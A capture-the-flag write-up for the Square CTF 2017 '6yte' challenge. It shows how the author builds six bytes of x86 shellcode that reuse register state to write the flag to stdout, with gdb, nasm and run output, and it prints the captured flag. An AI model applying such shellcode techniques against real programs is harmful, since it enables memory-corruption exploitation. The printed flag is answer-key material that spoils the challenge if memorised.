> # 6yte (1000 points, Exploit)
> You only get 6 of them
> 
>
> Our operatives found this site, which appears to control some of the androids’ infrastructure! There are only two problems. The robots love x86 assembly; the only thing easier for them to work with is binary. And they love terse command codes. Even 7 bytes was too many for this one.
> 
> This URL is unique to your team! Don't share it with competitors!
> https://*redacted*.capturethesquare.com

Solution is pretty similar to bytes, but eventually a lot simpler.

1. To get started, download the file
2. Run it: 
```
daMage@kalima:~/ctfs/squarectf2017/6yte$ ./6yte f000
Shellcode location: 0xf7762000
Flag location: 0xff956780
WUNTEE_CHALLENGE_FLAG environmental variable not set. Could not read flag.
```
3. Prepare the environment:
```
daMage@kalima:~/ctfs/squarectf2017/6yte$ echo abcdefghijklmnopqrstu > flag.txt
daMage@kalima:~/ctfs/squarectf2017/6yte$ export WUNTEE_CHALLENGE_FLAG=flag.txt
```
4. Run the executable with gdb, and pass the cc's (interrupt / Int3) as the shellcode. Now is a good time to check the registers: 
```
daMage@kalima:~/ctfs/squarectf2017/6yte$ gdb -q ./6yte
Reading symbols from ./6yte...(no debugging symbols found)...done.
(gdb) r cccccc
Starting program: /home/daMage/ctfs/squarectf2017/6yte/6yte cccccc
Shellcode location: 0xf7fd1000
Flag location: 0xffffd200

Program received signal SIGTRAP, Trace/breakpoint trap.
0xf7fd1001 in ?? ()
(gdb) info registers 
eax            0x4	4
ecx            0xf7fadbcc	-134554676
edx            0x5	5
ebx            0x1	1
esp            0xffffd1f0	0xffffd1f0
ebp            0xffffd298	0xffffd298
esi            0x2	2
edi            0xffffd200	-11776
eip            0xf7fd1001	0xf7fd1001
eflags         0x286	[ PF SF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) 
```
5. Notice that the flag address is already in edi, eax is already 4 and ebx is 1, almost set up for writing to stdout.
6. Set up simple shellcode:
```
daMage@kalima:~/ctfs/squarectf2017/6yte$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > mov ecx,edi
00000000  89F9              mov ecx,edi
nasm > mov dl,0x24
00000000  B224              mov dl,0x24
nasm > int 0x80
00000000  CD80              int 0x80
```
This gives us shellcode 89f9b224cd80
7. Try it locally:
```
daMage@kalima:~/ctfs/squarectf2017/6yte$ ./6yte 89f9b224cd80
Shellcode location: 0xf77bd000
Flag location: 0xffc6bba0
abcdefghijklmnopqrstu
[garbled]Segmentation fault
```
8. Finally pass the hex-encoded string to the online form and get flag:
```
Output:

Shellcode location: 0xf76fc000
Flag location: 0xffd41810
flag-rofib-lugaf-sedir-veguc-rynat


Status:

pid 115 SIGSEGV (signal 11) (core dumped)
```
